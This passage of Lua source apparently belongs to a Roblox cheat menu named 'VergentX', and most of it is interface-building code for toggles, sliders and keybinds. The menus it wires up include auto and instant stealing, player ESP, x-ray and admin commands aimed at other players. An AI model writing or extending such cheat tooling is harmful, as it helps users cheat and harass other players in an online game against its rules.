            local g = btn:FindFirstChildOfClass("UIGradient")
            if g then g.Enabled = isActive end
            local ab = btn:FindFirstChild("VergentX_AccentBar")
            if ab then
                TweenService:Create(ab, TweenInfo.new(0.22), { BackgroundTransparency = isActive and 0 or 1 }):Play()
            end
        end
    end
    for tabName, tabBtn in pairs(tabButtons) do
        tabBtn.MouseButton1Click:Connect(function() setActiveTab(tabName) end)
    end

    local function createSectionHeader(parent, text)
        local row = Instance.new("Frame", parent)
        row.Size = UDim2.new(1, -10, 0, 28)
        row.BackgroundTransparency = 1

        local dot = Instance.new("Frame", row)
        dot.Size = UDim2.new(0, 5, 0, 5)
        dot.Position = UDim2.new(0, 8, 0.5, -2)
        dot.BackgroundColor3 = Color3.fromRGB(204, 164, 72)
        dot.BorderSizePixel = 0
        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(1, -28, 1, 0)
        lbl.Position = UDim2.new(0, 20, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextColor3 = Color3.fromRGB(203, 205, 212)
        lbl.TextSize = 12
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local textW = 100
        pcall(function()
            local sz = game:GetService("TextService"):GetTextSize(text, 12, Enum.Font.Gotham, Vector2.new(1000, 28))
            textW = sz.X
        end)
        local line = Instance.new("Frame", row)
        line.Size = UDim2.new(1, -(20 + textW + 12 + 8), 0, 1)
        line.Position = UDim2.new(0, 20 + textW + 12, 0.5, 0)
        line.BackgroundColor3 = Theme.Accent1
        line.BackgroundTransparency = 0.25
        line.BorderSizePixel = 0
        gradient(line, nil, 0, NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.1),
            NumberSequenceKeypoint.new(1, 0.85),
        }))
        return row
    end

    local function rowShell(parent, height)
        local row = Instance.new("Frame", parent)
        row.Size = UDim2.new(1, -10, 0, height or 40)
        row.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
        row.BackgroundTransparency = 0.32
        row.BorderSizePixel = 0
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
        local rowLine = Instance.new("UIStroke", row)
        rowLine.Color = Color3.fromRGB(6, 6, 8)
        rowLine.Thickness = 1
        rowLine.Transparency = 0.85
        rowLine.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        return row, rowLine
    end

    local function createToggleRow(parent, text, defaultValue, callback)
        local row, rowLine = rowShell(parent, 40)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(1, -82, 1, 0)
        lbl.Position = UDim2.new(0, 14, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 13
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local ON_COL = Color3.fromRGB(188, 150, 62)
        local OFF_COL = Color3.fromRGB(44, 45, 51)
        local isOn = defaultValue and true or false

        local toggleFrame = Instance.new("Frame", row)
        toggleFrame.Size = UDim2.new(0, 48, 0, 24)
        toggleFrame.Position = UDim2.new(1, -60, 0.5, -12)
        toggleFrame.BackgroundColor3 = isOn and ON_COL or OFF_COL
        toggleFrame.BorderSizePixel = 0
        Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(1, 0)

        local toggleDot = Instance.new("Frame", toggleFrame)
        toggleDot.Size = UDim2.new(0, 20, 0, 20)
        toggleDot.Position = isOn and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)
        toggleDot.BackgroundColor3 = Color3.new(1, 1, 1)
        toggleDot.BorderSizePixel = 0
        Instance.new("UICorner", toggleDot).CornerRadius = UDim.new(1, 0)
        toggleRing(toggleFrame, 5)

        local toggleBtn = Instance.new("TextButton", row)
        toggleBtn.Size = UDim2.new(1, 0, 1, 0)
        toggleBtn.BackgroundTransparency = 1
        toggleBtn.AutoButtonColor = false
        toggleBtn.Text = ""

        row.MouseEnter:Connect(function()
            TweenService:Create(row, TweenInfo.new(0.16), { BackgroundTransparency = 0.6 }):Play()
            TweenService:Create(rowLine, TweenInfo.new(0.16), { Transparency = 0.6 }):Play()
        end)
        row.MouseLeave:Connect(function()
            TweenService:Create(row, TweenInfo.new(0.16), { BackgroundTransparency = 0.32 }):Play()
            TweenService:Create(rowLine, TweenInfo.new(0.16), { Transparency = 0.85 }):Play()
        end)

        local function paintState(v)
            isOn = v and true or false
            TweenService:Create(toggleDot, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Position = isOn and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)
            }):Play()
            TweenService:Create(toggleFrame, TweenInfo.new(0.2), {
                BackgroundColor3 = isOn and ON_COL or OFF_COL
            }):Play()
        end

        local function setState(v, silent)
            paintState(v)
            callback(isOn)
            if not silent then pcall(ShowNotification, text, isOn and "Enabled" or "Disabled") end
        end
        toggleBtn.MouseButton1Click:Connect(function() setState(not isOn) end)

        return row, setState, paintState
    end

    local function createSliderRow(parent, text, minV, maxV, default, suffix, callback, step)
        local function fmtVal(v)
            if step and step >= 1 then return tostring(math.floor(v + 0.5)) end
            local st = step or 0.1
            local snapped = math.floor(v / st + 0.5) * st
            local decimals = (st >= 0.1) and 1 or 2
            return string.format("%." .. decimals .. "f", snapped)
        end

        local row = rowShell(parent, 54)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.6, 0, 0, 24)
        lbl.Position = UDim2.new(0, 14, 0, 5)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 13
        lbl.TextColor3 = Color3.fromRGB(207, 209, 216)
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local value = default or minV
        local valLbl = Instance.new("TextLabel", row)
        valLbl.Size = UDim2.new(0, 70, 0, 24)
        valLbl.Position = UDim2.new(1, -84, 0, 5)
        valLbl.BackgroundTransparency = 1
        valLbl.Text = fmtVal(value) .. (suffix or "")
        valLbl.Font = Enum.Font.Gotham
        valLbl.TextSize = 13
        valLbl.TextColor3 = Color3.fromRGB(204, 164, 72)
        valLbl.TextXAlignment = Enum.TextXAlignment.Right
        valLbl.TextStrokeTransparency = 1

        local sliderBg = Instance.new("Frame", row)
        sliderBg.Size = UDim2.new(1, -28, 0, 7)
        sliderBg.Position = UDim2.new(0, 14, 0, 37)
        sliderBg.BackgroundColor3 = Color3.fromRGB(29, 30, 33)
        sliderBg.BorderSizePixel = 0
        sliderBg.Active = true
        Instance.new("UICorner", sliderBg).CornerRadius = UDim.new(1, 0)

        local fill = Instance.new("Frame", sliderBg)
        fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        fill.BorderSizePixel = 0
        fill.Size = UDim2.new((value - minV) / (maxV - minV), 0, 1, 0)
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
        gradient(fill, ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 118, 48)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(204, 164, 72)),
        }))

        local knob = Instance.new("Frame", sliderBg)
        knob.Size = UDim2.new(0, 24, 0, 12)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        knob.AnchorPoint = Vector2.new(math.clamp((value - minV) / (maxV - minV), 0, 1), 0.5)
        knob.Position = UDim2.new((value - minV) / (maxV - minV), 0, 0.5, 0)
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
        local knobStroke = Instance.new("UIStroke", knob)
        knobStroke.Color = Color3.fromRGB(204, 164, 72)
        knobStroke.Thickness = 1
        knobStroke.Transparency = 0.15
        knobStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local dragging = false
        local function updateSlider(inputX)
            local pos = sliderBg.AbsolutePosition.X
            local size = sliderBg.AbsoluteSize.X
            if size <= 0 then return end
            local pct = math.clamp((inputX - pos) / size, 0, 1)
            value = minV + (pct * (maxV - minV))
            if step then
                value = math.clamp(math.floor(value / step + 0.5) * step, minV, maxV)
            else
                value = math.floor(value * 10) / 10
            end
            local vpct = (maxV > minV) and ((value - minV) / (maxV - minV)) or 0
            fill.Size = UDim2.new(vpct, 0, 1, 0)
            knob.AnchorPoint = Vector2.new(vpct, 0.5)
            knob.Position = UDim2.new(vpct, 0, 0.5, 0)
            valLbl.Text = fmtVal(value) .. (suffix or "")
            callback(value)
        end

        local scrollLocked = nil
        local function lockScroll()
            if scrollLocked == nil and parent and parent:IsA("ScrollingFrame") then
                scrollLocked = parent.ScrollingEnabled
                parent.ScrollingEnabled = false
            end
        end
        local function unlockScroll()
            if scrollLocked ~= nil and parent and parent:IsA("ScrollingFrame") then
                parent.ScrollingEnabled = scrollLocked
            end
            scrollLocked = nil
        end

        local hitPad = Instance.new("TextButton", row)
        hitPad.Name = "VergentX_SliderTouch"
        hitPad.Position = UDim2.new(0, 8, 0, 26)
        hitPad.Size = UDim2.new(1, -16, 0, 26)
        hitPad.BackgroundTransparency = 1
        hitPad.Text = ""
        hitPad.AutoButtonColor = false
        hitPad.ZIndex = 3

        local function beginDrag(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1
                and input.UserInputType ~= Enum.UserInputType.Touch then return end
            dragging = true
            lockScroll()
            updateSlider(input.Position.X)
        end

        hitPad.InputBegan:Connect(beginDrag)
        sliderBg.InputBegan:Connect(beginDrag)
        knob.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                lockScroll()
            end
        end)
        vxBind(UserInputService.InputEnded, function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
                unlockScroll()
            end
        end)
        vxBind(UserInputService.InputChanged, function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                updateSlider(input.Position.X)
            end
        end)
        return row
    end

    local function createButtonRow(parent, text, buttonText, callback)
        local row = rowShell(parent, 40)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(1, -110, 1, 0)
        lbl.Position = UDim2.new(0, 14, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 13
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(0, 92, 0, 28)
        btn.Position = UDim2.new(1, -104, 0.5, -14)
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 19)
        btn.BackgroundTransparency = 0.32
        btn.AutoButtonColor = false
        btn.BorderSizePixel = 0
        btn.Text = buttonText
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 11
        btn.TextColor3 = Color3.fromRGB(224, 225, 229)
        btn.TextStrokeTransparency = 1
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        local bStroke = Instance.new("UIStroke", btn)
        bStroke.Color = Color3.fromRGB(6, 6, 8)
        bStroke.Thickness = 0.5
        bStroke.Transparency = 0.5
        bStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.55 }):Play()
            TweenService:Create(bStroke, TweenInfo.new(0.18), { Transparency = 0.2 }):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.32 }):Play()
            TweenService:Create(bStroke, TweenInfo.new(0.18), { Transparency = 0.5 }):Play()
        end)
        btn.MouseButton1Click:Connect(function()
            task.spawn(function() pcall(callback, btn) end)
        end)
        return row, btn
    end

    local function createDropdownRow(parent, text, options, current, callback)
        local row = rowShell(parent, 40)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(1, -136, 1, 0)
        lbl.Position = UDim2.new(0, 14, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 13
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local index = 1
        for i, o in ipairs(options) do
            if o == current then index = i break end
        end

        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(0, 118, 0, 28)
        btn.Position = UDim2.new(1, -130, 0.5, -14)
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 19)
        btn.BackgroundTransparency = 0.32
        btn.AutoButtonColor = false
        btn.BorderSizePixel = 0
        btn.Text = options[index]
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 11
        btn.TextColor3 = Color3.fromRGB(224, 225, 229)
        btn.TextStrokeTransparency = 1
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        local bStroke = Instance.new("UIStroke", btn)
        bStroke.Color = Color3.fromRGB(6, 6, 8)
        bStroke.Thickness = 0.5
        bStroke.Transparency = 0.5
        bStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.55 }):Play()
            TweenService:Create(bStroke, TweenInfo.new(0.18), { Transparency = 0.2 }):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.32 }):Play()
            TweenService:Create(bStroke, TweenInfo.new(0.18), { Transparency = 0.5 }):Play()
        end)

        btn.MouseButton1Click:Connect(function()
            index = (index % #options) + 1
            btn.Text = options[index]
            pcall(callback, options[index])
            pcall(ShowNotification, text, options[index])
        end)

        return row, btn
    end

    local function createKeybindRow(parent, text, defaultKey, callback)
        local row = rowShell(parent, 40)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.6, 0, 1, 0)
        lbl.Position = UDim2.new(0, 12, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 12
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local currentKey = (defaultKey ~= nil and defaultKey ~= "") and defaultKey or "None"
        local keyBtn = Instance.new("TextButton", row)
        keyBtn.Size = UDim2.new(0, 92, 0, 28)
        keyBtn.Position = UDim2.new(1, -104, 0.5, -14)
        keyBtn.AutoButtonColor = false
        keyBtn.BackgroundColor3 = Color3.fromRGB(16, 16, 19)
        keyBtn.BackgroundTransparency = 0.35
        keyBtn.BorderSizePixel = 0
        keyBtn.Text = currentKey
        keyBtn.Font = Enum.Font.Gotham
        keyBtn.TextSize = 12
        keyBtn.TextColor3 = Color3.fromRGB(224, 225, 229)
        keyBtn.TextStrokeTransparency = 1
        Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0, 8)
        local kbStroke = Instance.new("UIStroke", keyBtn)
        kbStroke.Color = Color3.fromRGB(6, 6, 8)
        kbStroke.Thickness = 0.5
        kbStroke.Transparency = 0.5
        kbStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        keyBtn.MouseEnter:Connect(function()
            TweenService:Create(keyBtn, TweenInfo.new(0.18), { BackgroundTransparency = 0.15 }):Play()
            TweenService:Create(kbStroke, TweenInfo.new(0.18), { Transparency = 0.2 }):Play()
        end)
        keyBtn.MouseLeave:Connect(function()
            TweenService:Create(keyBtn, TweenInfo.new(0.18), { BackgroundTransparency = 0.35 }):Play()
            TweenService:Create(kbStroke, TweenInfo.new(0.18), { Transparency = 0.5 }):Play()
        end)

        local isCapturing = false
        keyBtn.MouseButton1Click:Connect(function()
            if isCapturing then return end
            isCapturing = true
            _G.VXBindingKey = true
            local oldText = keyBtn.Text
            keyBtn.Text = "..."
            keyBtn.TextColor3 = Theme.Warning

            local con
            con = vxBind(UserInputService.InputBegan, function(input)
                if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
                isCapturing = false
                con:Disconnect()
                if input.KeyCode == Enum.KeyCode.Backspace then
                    currentKey = "None"
                    keyBtn.Text = "None"
                    keyBtn.TextColor3 = Color3.fromRGB(224, 225, 229)
                    callback("")
                else
                    currentKey = input.KeyCode.Name
                    keyBtn.Text = currentKey
                    keyBtn.TextColor3 = Color3.fromRGB(204, 164, 72)
                    callback(currentKey)
                end
                task.delay(0.1, function() _G.VXBindingKey = false end)
            end)

            task.delay(5, function()
                if isCapturing then
                    keyBtn.Text = oldText
                    keyBtn.TextColor3 = Color3.fromRGB(224, 225, 229)
                    isCapturing = false
                    _G.VXBindingKey = false
                    if con then con:Disconnect() end
                end
            end)
        end)

        local function setKey(k)
            currentKey = (k ~= nil and k ~= "") and k or "None"
            keyBtn.Text = currentKey
            keyBtn.TextColor3 = Color3.fromRGB(224, 225, 229)
        end
        return row, setKey
    end

    local function doResetConfig()
        for name, fn in pairs(F) do
            if type(fn) == "function" and name:sub(1, 3) == "set" then pcall(fn, false) end
        end
        pcall(function()
            if writefile and isfile and isfile(FileName) then writefile(FileName, "{}") end
            if delfile and isfile and isfile(FileName) then delfile(FileName) end
        end)
        applyFactoryDefaults(CONFIG)
        _G.VXGuiLocked = false
        pcall(VXApplyUiScale, CONFIG.UI_SCALE)
        sFrame.Position = tableToUDim2(CONFIG.MAIN_POS, UDim2.new(0.5, 0, 0.5, 0))
        if _G.VXStatusHub then _G.VXStatusHub.SetPosition(tableToUDim2(CONFIG.HUB_POS)) end
        if _G.VXCmdPanel then
            _G.VXCmdPanel.SetPosition(tableToUDim2(CONFIG.CMD_POS))
            _G.VXCmdPanel.SetVisible(false)
        end
        if AP.SetPosition then AP.SetPosition(tableToUDim2(CONFIG.QUICK_POS)) end
        if AdminControl.SetPosition then AdminControl.SetPosition(tableToUDim2(CONFIG.ACTRL_POS)) end
        if _G.VXActionsPanel and _G.VXActionsPanel.SetPosition then
            _G.VXActionsPanel.SetPosition(tableToUDim2(CONFIG.ACT_POS))
        end
        if _G.VXLauncher and _G.VXLauncher.SetPosition then
            _G.VXLauncher.SetPosition(tableToUDim2(CONFIG.LAUNCH_POS))
        end
        if _G.VXControlPanel and _G.VXControlPanel.SetPosition then
            _G.VXControlPanel.SetPosition(tableToUDim2(CONFIG.CTRL_POS))
        end
        pcall(function()
            if Workspace.CurrentCamera then Workspace.CurrentCamera.FieldOfView = CONFIG.FOV end
        end)
        saveConfig()
        pcall(function() ShowNotification("Config Reset", "Everything wiped - rejoin to fully apply") end)
    end

    local function createResetConfigRow(parent)
        local row = rowShell(parent, 40)
        row.LayoutOrder = 100000

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(1, -82, 1, 0)
        lbl.Position = UDim2.new(0, 14, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Reset Config"
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 13
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(0, 70, 0, 28)
        btn.Position = UDim2.new(1, -82, 0.5, -14)
        btn.BackgroundColor3 = Color3.fromRGB(26, 11, 16)
        btn.BackgroundTransparency = 0.32
        btn.AutoButtonColor = false
        btn.BorderSizePixel = 0
        btn.Text = "RESET"
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 11
        btn.TextColor3 = Color3.fromRGB(255, 130, 150)
        btn.TextStrokeTransparency = 1
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        local btnStroke = Instance.new("UIStroke", btn)
        btnStroke.Color = Theme.Error
        btnStroke.Thickness = 0.5
        btnStroke.Transparency = 0.5
        btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        btn.MouseEnter:Connect(function()
            btn.BackgroundTransparency = 0.55
            btnStroke.Transparency = 0.15
        end)
        btn.MouseLeave:Connect(function()
            btn.BackgroundTransparency = 0.32
            btnStroke.Transparency = 0.5
        end)
        btn.MouseButton1Click:Connect(doResetConfig)
        return row
    end

    do
        local page = contentScrolls["Player"]
        createSectionHeader(page, "PLAYER")
        createToggleRow(page, "Anti Ragdoll", CONFIG.ANTI_RAGDOLL, function(v) F.setAntiRagdoll(v) end)
        local _, _, kickPaint = createToggleRow(page, "Kick on Steal", CONFIG.AUTO_KICK, function(v) F.setAutoKick(v) end)
        _G.VXKickVisuals[#_G.VXKickVisuals + 1] = kickPaint
        createToggleRow(page, "Infinite Jump", CONFIG.INFINITE_JUMP, function(v) F.setInfiniteJump(v) end)
        createDropdownRow(page, "Flying Tool", _G.VXFlyTools, CONFIG.FLY_TOOL, function(v)
            CONFIG.FLY_TOOL = v
            saveConfig()
        end)
    end

    do
        local page = contentScrolls["Performance"]
        createSectionHeader(page, "VISUAL")
        createToggleRow(page, "Graphics Stripping", CONFIG.GRAPHICS_STRIP, function(v) F.setGraphicsStrip(v) end)
        createToggleRow(page, "X-Ray Bases", CONFIG.XRAY, function(v) F.setXray(v) end)
        createSliderRow(page, "Field of View", 70, 120, CONFIG.FOV or 70, "\u{00B0}", function(v)
            CONFIG.FOV = math.floor(v + 0.5)
            saveConfig()
            if Workspace.CurrentCamera then Workspace.CurrentCamera.FieldOfView = CONFIG.FOV end
        end, 1)
    end

    do
        local page = contentScrolls["ESP"]
        createSectionHeader(page, "PLAYERS")
        createToggleRow(page, "Player ESP", CONFIG.PLAYER_ESP, function(v) F.setPlayerESP(v) end)
        createToggleRow(page, "Base Owner ESP", CONFIG.BASE_OWNER_ESP, function(v) F.setBaseOwnerESP(v) end)
        createToggleRow(page, "Base Displays", CONFIG.BASE_DISPLAY, function(v) F.setBaseDisplay(v) end)
        createSectionHeader(page, "WORLD")
        createToggleRow(page, "Slot ESP", CONFIG.SLOT_ESP, function(v) F.setSlotESP(v) end)
        createToggleRow(page, "Slot Platforms", CONFIG.SLOT_PLATFORMS, function(v) F.setSlotPlatforms(v) end)
        createToggleRow(page, "Floor Platform", CONFIG.FLOOR_PLATFORM, function(v) F.setFloorPlatform(v) end)
        createToggleRow(page, "Base Detector", CONFIG.BASE_DETECTOR, function(v) F.setBaseDetector(v) end)
    end

    do
        local page = contentScrolls["Display"]
        createSectionHeader(page, "PANELS")
        createToggleRow(page, "Command Cooldowns", CONFIG.CMD_PANEL, function(v)
            CONFIG.CMD_PANEL = v
            if _G.VXCmdPanel then _G.VXCmdPanel.SetVisible(v) end
            saveConfig()
        end)
        createToggleRow(page, "Admin Panel", CONFIG.AP_PANEL, function(v) F.setAdminPanel(v) end)
        createToggleRow(page, "Admin Control", CONFIG.ADMIN_CONTROL, function(v) F.setAdminControl(v) end)
        createToggleRow(page, "Control Panel", CONFIG.CTRL_PANEL, function(v) F.setControlPanel(v) end)
        createToggleRow(page, "Actions Panel", CONFIG.ACTIONS_PANEL, function(v) F.setActionsPanel(v) end)

        createSectionHeader(page, "INTERFACE")
        createSliderRow(page, "UI Scale", 0.7, 1.4, CONFIG.UI_SCALE or 1, "x", function(v)
            VXApplyUiScale(v)
        end, 0.05)
        createToggleRow(page, "Lock GUI Position", _G.VXGuiLocked, function(v)
            _G.VXGuiLocked = v
            CONFIG.GUI_LOCKED = v
            saveConfig()
        end)
    end

    do
        local page = contentScrolls["Stealing"]
        createSectionHeader(page, "STEALING")
        local setAutoToggle, setInstToggle

        local _, autoSetter = createToggleRow(page, "Auto Steal", CONFIG.AUTO_STEAL, function(v)
            if v and CONFIG.INSTANT_STEAL and setInstToggle then
                setInstToggle(false, true)
            end
            CONFIG.AUTO_STEAL = v
            Steal.Sync()
            saveConfig()
        end)
        setAutoToggle = autoSetter

        local _, instSetter = createToggleRow(page, "Instant Steal", CONFIG.INSTANT_STEAL, function(v)
            if v and CONFIG.AUTO_STEAL and setAutoToggle then
                setAutoToggle(false, true)
            end
            F.setInstantSteal(v)
        end)
        setInstToggle = instSetter
    end

    do
        local page = contentScrolls["Admin"]
        local CMD_TEXT = {
            balloon = "Balloon", inverse = "Inverse", jail = "Jail",
            jumpscare = "Jumpscare", morph = "Morph", ragdoll = "Ragdoll",
            rocket = "Rocket", tiny = "Tiny",
        }

        createSectionHeader(page, "COMMAND SEQUENCER")

        local seqHolder = Instance.new("Frame", page)
        seqHolder.Size = UDim2.new(1, -10, 0, 0)
        seqHolder.AutomaticSize = Enum.AutomaticSize.Y
        seqHolder.BackgroundTransparency = 1
        local seqLayout = Instance.new("UIListLayout", seqHolder)
        seqLayout.Padding = UDim.new(0, 4)
        seqLayout.SortOrder = Enum.SortOrder.LayoutOrder

        local function seqDepth(el)
            return gradient(el, ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(148, 148, 148)),
            }), 90)
        end

        local rebuildSeq
        rebuildSeq = function()
            for _, ch in ipairs(seqHolder:GetChildren()) do
                if ch:IsA("Frame") then ch:Destroy() end
            end
            for i, id in ipairs(CONFIG.ADMIN_CMD_ORDER) do
                local row = Instance.new("Frame", seqHolder)
                row.Size = UDim2.new(1, 0, 0, 34)
                row.LayoutOrder = i
                row.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
                row.BackgroundTransparency = 0.1
                row.BorderSizePixel = 0
                Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
                seqDepth(row)

                local grip = Instance.new("TextLabel", row)
                grip.Size = UDim2.new(0, 12, 1, 0)
                grip.Position = UDim2.new(0, 4, 0, 0)
                grip.BackgroundTransparency = 1
                grip.Text = "\226\137\161"
                grip.Font = Enum.Font.Gotham
                grip.TextSize = 11
                grip.TextColor3 = Theme.TextMuted
                grip.TextStrokeTransparency = 1

                local num = Instance.new("TextLabel", row)
                num.Size = UDim2.new(0, 22, 1, 0)
                num.Position = UDim2.new(0, 18, 0, 0)
                num.BackgroundTransparency = 1
                num.Text = "#" .. i
                num.Font = Enum.Font.Gotham
                num.TextSize = 10
                num.TextColor3 = Theme.GoldHi
                num.TextStrokeTransparency = 1

                local dot = Instance.new("Frame", row)
                dot.Size = UDim2.new(0, 6, 0, 6)
                dot.Position = UDim2.new(0, 44, 0.5, -3)
                dot.BorderSizePixel = 0
                Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

                local nameLbl = Instance.new("TextButton", row)
                nameLbl.Size = UDim2.new(1, -114, 1, 0)
                nameLbl.Position = UDim2.new(0, 58, 0, 0)
                nameLbl.BackgroundTransparency = 1
                nameLbl.AutoButtonColor = false
                nameLbl.Font = Enum.Font.Gotham
                nameLbl.TextSize = 11
                nameLbl.TextXAlignment = Enum.TextXAlignment.Left
                nameLbl.Text = CMD_TEXT[id] or id
                nameLbl.TextStrokeTransparency = 1

                local function paintName()
                    local en = CONFIG.ADMIN_CMD_ENABLED or {}
                    local on = en[id] ~= false
                    nameLbl.TextColor3 = on and Theme.TextPrimary or Theme.TextMuted
                    dot.BackgroundColor3 = on and Color3.fromRGB(120, 240, 170) or Color3.fromRGB(70, 70, 80)
                end
                paintName()
                nameLbl.MouseButton1Click:Connect(function()
                    CONFIG.ADMIN_CMD_ENABLED = CONFIG.ADMIN_CMD_ENABLED or {}
                    CONFIG.ADMIN_CMD_ENABLED[id] = not (CONFIG.ADMIN_CMD_ENABLED[id] ~= false)
                    saveConfig()
                    paintName()
                end)

                local function mkArrow(txt, xoff, dir)
                    local b = Instance.new("TextButton", row)
                    b.Size = UDim2.new(0, 22, 0, 22)
                    b.Position = UDim2.new(1, xoff, 0.5, -11)
                    b.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
                    b.BackgroundTransparency = 0.1
                    b.Text = txt
                    b.Font = Enum.Font.Gotham
                    b.TextSize = 9
                    b.TextColor3 = Color3.fromRGB(203, 206, 213)
                    b.AutoButtonColor = false
                    b.BorderSizePixel = 0
                    b.TextStrokeTransparency = 1
                    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
                    seqDepth(b)
                    b.MouseButton1Click:Connect(function()
                        local ord = CONFIG.ADMIN_CMD_ORDER
                        local j = i + dir
                        if j >= 1 and j <= #ord then
                            ord[i], ord[j] = ord[j], ord[i]
                            saveConfig()
                            rebuildSeq()
                        end
                    end)
                end
                mkArrow("\226\150\178", -52, -1)
                mkArrow("\226\150\188", -26, 1)
            end
        end
        rebuildSeq()

        createSliderRow(page, "Command Delay", 0, 0.5, CONFIG.ADMIN_CMD_DELAY or 0, "s", function(v)
            CONFIG.ADMIN_CMD_DELAY = math.floor(math.clamp(v, 0, 0.5) * 20 + 0.5) / 20
            saveConfig()
        end, 0.05)
    end

    do
        local page = contentScrolls["Keybinds"]

        local function kbRow(label, key)
            createKeybindRow(page, label, CONFIG.KEYS[key] or "", function(val)
                CONFIG.KEYS[key] = val
                saveConfig()
            end)
        end

        createSectionHeader(page, "KEYBINDS")
        kbRow("Menu Key", "Menu")
        kbRow("Carpet Speed", "CarpetSpeed")
        kbRow("Proximity AP", "ProximityAP")
        kbRow("Click to AP", "ClickToAP")
        kbRow("Spam Nearest", "SpamNearest")
        kbRow("Spam Owner", "SpamOwner")
        kbRow("Instant Clone", "InstantClone")
        kbRow("Instant Reset", "InstantReset")
        kbRow("Rejoin Server", "Rejoin")
        kbRow("Copy Job ID", "CopyJobId")
        kbRow("Low Player Hop", "ServerHop")
    end

    do
        local page = contentScrolls["Misc"]

        local function copyToClipboard(value)
